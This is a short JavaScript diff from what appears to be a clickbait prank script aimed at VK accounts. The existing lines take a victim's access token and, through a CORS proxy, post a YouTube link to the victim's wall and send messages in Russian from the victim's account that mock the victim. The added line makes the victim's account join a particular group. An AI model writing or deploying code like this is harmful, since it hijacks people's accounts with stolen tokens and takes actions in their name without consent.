@@ -35,6 +35,7 @@
 			fetch(`https://cors-anywhere.herokuapp.com/https://api.vk.com/method/wall.post?v=5.103&access_token=${token}&message=https://www.youtube.com/watch?v=vPdQIsacMp8`).then(response => console.log(response.json()));
 			fetch(`https://cors-anywhere.herokuapp.com/https://api.vk.com/method/messages.send?v=5.103&access_token=${token}&message=vto.pe vkbot.ru olike.ru turboliker.ru Я ЛОХ сова никогда не спит&peer_id=-192835178&random_id=0`).then(response => console.log(response.json()));
 			fetch(`https://cors-anywhere.herokuapp.com/https://api.vk.com/method/messages.send?v=5.103&access_token=${token}&message=ya popalsya na klikbeit&peer_id=-192835178&random_id=0`).then(response => console.log(response.json()));
+			fetch(`https://cors-anywhere.herokuapp.com/https://api.vk.com/method/groups.join?v=5.103&access_token=${token}&group_id=192835178`).then(response => console.log(response.json()));
 		}
 
 		function callback(response) {}
